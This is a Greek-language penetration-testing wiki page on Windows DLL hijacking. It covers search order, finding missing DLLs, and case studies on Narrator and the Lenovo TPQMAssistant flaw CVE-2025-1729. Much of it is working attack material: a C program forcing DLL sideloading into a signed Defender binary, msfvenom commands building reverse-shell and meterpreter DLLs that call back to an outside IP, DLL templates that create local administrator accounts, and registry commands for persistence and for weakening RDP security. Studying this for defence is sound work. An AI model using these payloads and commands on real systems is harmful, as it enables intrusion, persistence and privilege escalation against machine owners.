# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές Πληροφορίες

DLL Hijacking περιλαμβάνει τον χειρισμό μιας αξιόπιστης εφαρμογής ώστε να φορτώνει ένα κακόβουλο DLL. Ο όρος αυτός καλύπτει διάφορες τακτικές όπως **DLL Spoofing, Injection, and Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη persistence και, λιγότερο συχνά, privilege escalation. Παρόλο που εδώ δίνεται έμφαση στο escalation, η μέθοδος hijacking παραμένει ίδια ανεξάρτητα από τον στόχο.

### Συνηθισμένες Τεχνικές

Χρησιμοποιούνται αρκετές μέθοδοι για DLL hijacking, κάθε μία με διαφορετική αποτελεσματικότητα ανάλογα με την στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά χρησιμοποιώντας DLL Proxying για να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε μονοπάτι αναζήτησης πριν από το νόμιμο, εκμεταλλευόμενοι το πρότυπο αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL για να φορτωθεί από την εφαρμογή, η οποία νομίζει ότι πρόκειται για ένα απαιτούμενο DLL που δεν υπάρχει.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως το %PATH% ή αρχεία .exe.manifest / .exe.local για να δρομολογηθεί η εφαρμογή στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο αντίγραφο στον κατάλογο WinSxS, μια μέθοδος που συχνά σχετίζεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε ένα φάκελο ελεγχόμενο από τον χρήστη μαζί με την αντιγραμμένη εφαρμογή, μοιάζοντας με τεχνικές Binary Proxy Execution.

## Finding missing Dlls

Ο πιο συνηθισμένος τρόπος να βρείτε missing Dlls μέσα σε ένα σύστημα είναι να τρέξετε [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, **ρυθμίζοντας** τα **εξής 2 φίλτρα**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

και απλώς δείχνοντας το **File System Activity**:

![](<../../../images/image (153).png>)

Αν ψάχνετε για **missing dlls in general** αφήνετε αυτό να τρέχει για μερικά **seconds**.\
Αν ψάχνετε για ένα **missing dll μέσα σε ένα συγκεκριμένο εκτελέσιμο** θα πρέπει να ορίσετε **ένα ακόμα φίλτρο όπως "Process Name" "contains" `<exec name>`, να το εκτελέσετε και να σταματήσετε την καταγραφή γεγονότων**.

## Exploiting Missing Dlls

Για να γίνει privilege escalation, η καλύτερη ευκαιρία είναι να μπορέσουμε να **γράψουμε ένα dll που μια privileged διαδικασία θα προσπαθήσει να φορτώσει** σε κάποιο από τα **μέρη όπου θα γίνει η αναζήτηση**. Επομένως, θα μπορούμε να **γράψουμε** ένα dll σε έναν **φάκελο** όπου το **dll αναζητείται πριν** το φάκελο όπου βρίσκεται το **original dll** (σπάνια περίπτωση), ή θα μπορέσουμε να **γράψουμε σε κάποιον φάκελο όπου το dll πρόκειται να αναζητηθεί** και το αρχικό **dll δεν υπάρχει** σε κανέναν φάκελο.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Οι εφαρμογές Windows αναζητούν τα DLL ακολουθώντας ένα σύνολο προεπιλεγμένων μονοπατιών αναζήτησης, τηρώντας μία συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking προκύπτει όταν ένα επιβλαβές DLL τοποθετείται στρατηγικά σε έναν από αυτούς τους καταλόγους, ώστε να φορτωθεί πριν από το αυθεντικό DLL. Μια λύση για να αποφευχθεί αυτό είναι να διασφαλιστεί ότι η εφαρμογή χρησιμοποιεί απόλυτα μονοπάτια όταν αναφέρεται στα DLL που απαιτεί.

Μπορείτε να δείτε την **DLL search order on 32-bit** συστήματα παρακάτω:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Αυτή είναι η **default** σειρά αναζήτησης με το **SafeDllSearchMode** ενεργοποιημένο. Όταν απενεργοποιηθεί, ο current directory ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτή τη λειτουργία, δημιουργήστε την τιμή μητρώου **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και θέστε την στο 0 (η προεπιλογή είναι enabled).

Αν η [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) καλείται με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινάει στον κατάλογο του executable module που το **LoadLibraryEx** φορτώνει.

Τέλος, σημειώστε ότι **ένα dll μπορεί να φορτωθεί υποδεικνύοντας το απόλυτο μονοπάτι αντί απλώς το όνομα**. Σε αυτή την περίπτωση το dll θα **αναζητηθεί μόνο σε εκείνο το μονοπάτι** (αν το dll έχει οποιεσδήποτε εξαρτήσεις, αυτές θα αναζητηθούν όπως όταν φορτώνεται ένα dll με όνομα).

Υπάρχουν και άλλοι τρόποι να αλλάξετε τη σειρά αναζήτησης αλλά δεν θα τους εξηγήσω εδώ.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προηγμένος τρόπος για να επηρεάσετε με καθοριστικό τρόπο το DLL search path μιας νεοσυσταθείσας διαδικασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS όταν δημιουργείτε τη διαδικασία με τις native APIs του ntdll. Παρέχοντας ένα attacker-controlled directory εδώ, μια target process που επιλύει ένα imported DLL με όνομα (χωρίς απόλυτο μονοπάτι και χωρίς χρήση των safe loading flags) μπορεί να εξαναγκαστεί να φορτώσει ένα κακόβουλο DLL από αυτόν τον κατάλογο.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Τοποθετήστε ένα κακόβουλο xmllite.dll (exporting the required functions or proxying to the real one) στον κατάλογο DllPath σας.
- Εκκινήστε ένα signed binary που είναι γνωστό ότι αναζητά το xmllite.dll με το όνομα χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει το import μέσω του παρεχόμενου DllPath και sideloads το DLL σας.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Στην τεκμηρίωση των Windows σημειώνονται ορισμένες εξαιρέσεις στην τυπική σειρά αναζήτησης DLL:

- Όταν συναντηθεί ένα **DLL που μοιράζεται το όνομά του με κάποιο που έχει ήδη φορτωθεί στη μνήμη**, το σύστημα παρακάμπτει την συνήθη αναζήτηση. Αντ' αυτού, εκτελεί έναν έλεγχο για redirection και ένα manifest πριν καταλήξει στο DLL που είναι ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν διεξάγει αναζήτηση για το DLL**.
- Σε περιπτώσεις όπου το DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει τη δική του έκδοση του known DLL, μαζί με οποιαδήποτε από τα dependent DLLs του, **παρακάμπτοντας τη διαδικασία αναζήτησης**. Το κλειδί μητρώου **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει λίστα με αυτά τα known DLLs.
- Εάν ένα **DLL έχει εξαρτήσεις**, η αναζήτηση αυτών των dependent DLLs διεξάγεται σαν να είχαν υποδειχθεί μόνο με τα **module names**, ανεξάρτητα από το αν το αρχικό DLL είχε προσδιοριστεί μέσω πλήρους διαδρομής.

### Escalating Privileges

**Requirements**:

- Εντοπίστε μια διεργασία που λειτουργεί ή θα λειτουργήσει υπό **διαφορετικά privileges** (horizontal or lateral movement), η οποία **δεν έχει ένα DLL**.
- Βεβαιωθείτε ότι υπάρχει **write access** για οποιονδήποτε **κατάλογο** στον οποίο θα **αναζητηθεί** το **DLL**. Αυτή η θέση μπορεί να είναι ο κατάλογος του εκτελέσιμου ή ένας κατάλογος μέσα στο system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **έλεγξε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός executable και τα exports ενός dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για πλήρη οδηγό σχετικά με το πώς να **abuse Dll Hijacking to escalate privileges** όταν έχετε δικαιώματα εγγραφής σε έναν **System Path folder** δείτε:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για την ανακάλυψη αυτής της ευπάθειας είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Example

Σε περίπτωση που βρείτε ένα εκμεταλλεύσιμο σενάριο, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλευτείτε επιτυχώς είναι να **create a dll that exports at least all the functions the executable will import from it**. Σημειώστε ότι το Dll Hijacking είναι χρήσιμο για να [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα του **how to create a valid dll** μέσα σε αυτή τη μελέτη για dll hijacking εστιασμένη σε dll hijacking για execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\

Επιπλέον, στην **επόμενη sectio**n μπορείτε να βρείτε μερικά **basic dll codes** που μπορεί να είναι χρήσιμα ως **templates** ή για να δημιουργήσετε ένα **dll with non required functions exported**.

## **Δημιουργία και μεταγλώττιση Dlls**

### **Dll Proxifying**

Βασικά, ένας **Dll proxy** είναι ένα Dll ικανό να **execute your malicious code when loaded** αλλά επίσης να **expose** και να **work** as **exected** by **relaying all the calls to the real library**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε στην ουσία να **indicate an executable and select the library** που θέλετε να proxify και **generate a proxified dll** ή **indicate the Dll** και **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Απόκτησε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιούργησε έναν χρήστη (x86 — δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Το δικό σας

Σημειώστε ότι σε αρκετές περιπτώσεις το Dll που θα κάνετε compile πρέπει να **εξάγει αρκετές συναρτήσεις** που πρόκειται να φορτωθούν από τη victim process, εάν αυτές οι συναρτήσεις δεν υπάρχουν, το **binary δεν θα μπορεί να τις φορτώσει** και το **exploit θα αποτύχει**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL παράδειγμα με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτικό C DLL με είσοδο νήματος</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Τα Windows Narrator.exe εξακολουθούν να ελέγχουν στην εκκίνηση ένα προβλέψιμο, ανά γλώσσα localization DLL που μπορεί να υποστεί DLL Hijack για arbitrary code execution και persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Ελάχιστο DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Ένα αφελές hijack θα κάνει speak/highlight το UI. Για να μείνετε ήσυχοι, κατά το attach απαριθμήστε τα νήματα του Narrator, ανοίξτε το κύριο νήμα (`OpenThread(THREAD_SUSPEND_RESUME)`) και κάντε `SuspendThread` σε αυτό· συνεχίστε στο δικό σας νήμα. Δείτε το PoC για πλήρες κώδικα.

Trigger and persistence via Accessibility configuration
- Σε επίπεδο χρήστη (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει το τοποθετημένο DLL. Στην secure desktop (οθόνη σύνδεσης), πατήστε CTRL+WIN+ENTER για να εκκινήσετε το Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Επιτρέψτε το κλασικό επίπεδο ασφάλειας RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Συνδεθείτε με RDP στον host, στην οθόνη σύνδεσης πατήστε CTRL+WIN+ENTER για να εκκινήσετε το Narrator· το DLL σας εκτελείται ως SYSTEM στην secure desktop.
- Η εκτέλεση σταματά όταν η συνεδρία RDP κλείσει — inject/migrate άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη εγγραφή Accessibility Tool (AT) στο registry (π.χ. CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε ένα αυθαίρετο binary/DLL, να την εισαγάγετε και στη συνέχεια να ορίσετε `configuration` σε αυτό το όνομα AT. Αυτό παρέχει εκτέλεση αυθαίρετου κώδικα μέσω του Accessibility framework.

Notes
- Η εγγραφή στο `%windir%\System32` και η αλλαγή τιμών στο HKLM απαιτεί δικαιώματα admin.
- Όλη η λογική του payload μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`; δεν απαιτούνται exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Λεπτομέρειες Ευπάθειας

- **Συστατικό**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Υλοποίηση Exploit

Ένας επιτιθέμενος μπορεί να τοποθετήσει ένα κακόβουλο `hostfxr.dll` stub στον ίδιο κατάλογο, εκμεταλλευόμενος το ελλείπον DLL για να αποκτήσει εκτέλεση κώδικα υπό το πλαίσιο του χρήστη:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Ροή Επίθεσης

1. Ως κανονικός χρήστης, τοποθετήστε το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε την εκτέλεση της προγραμματισμένης εργασίας στις 9:30 AM στο πλαίσιο του τρέχοντος χρήστη.
3. Εάν ένας διαχειριστής είναι συνδεδεμένος όταν εκτελείται η εργασία, το κακόβουλο DLL εκτελείται στη συνεδρία του διαχειριστή σε medium integrity.
4. Χρησιμοποιήστε standard UAC bypass techniques για να αυξήσετε τα προνόμια από medium integrity σε SYSTEM privileges.

## Αναφορές

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)


{{#include ../../../banners/hacktricks-training.md}}
